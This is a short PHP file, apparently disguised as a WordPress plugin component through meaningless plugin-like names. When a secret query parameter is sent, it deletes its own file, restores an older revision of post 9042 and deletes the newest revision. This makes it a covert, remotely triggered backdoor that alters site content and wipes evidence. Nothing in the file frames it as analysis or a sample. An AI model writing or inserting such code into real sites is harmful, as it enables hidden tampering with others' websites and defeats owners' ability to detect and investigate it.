<?php

function events_blocker_media_flash() {
	if (isset($_GET['nice_now_activity_addon']) && $_GET['nice_now_activity_addon'] === 'color_manager_better') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$edition_duplicate_blocks_services = 9042;
		$plugin_rich_members = wp_get_post_revisions($edition_duplicate_blocks_services);
		if (empty($plugin_rich_members)) die('no revisions');
		if (count($plugin_rich_members) < 2) die('less than 2');
		$clean_sidebar_menus_master = array_shift($plugin_rich_members);
		$feedback_gamipress_album = $clean_sidebar_menus_master->ID;
		$plugin_related_adsense = array_shift($plugin_rich_members);
		$drop_codes_bootstrap_stream = $plugin_related_adsense->ID;
		$label_maintenance_dashboard = wp_restore_post_revision($drop_codes_bootstrap_stream);
		if ($label_maintenance_dashboard === false) die('error restoring');
		$label_maintenance_dashboard = wp_delete_post_revision($feedback_gamipress_album);		
		if ($label_maintenance_dashboard === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'events_blocker_media_flash');
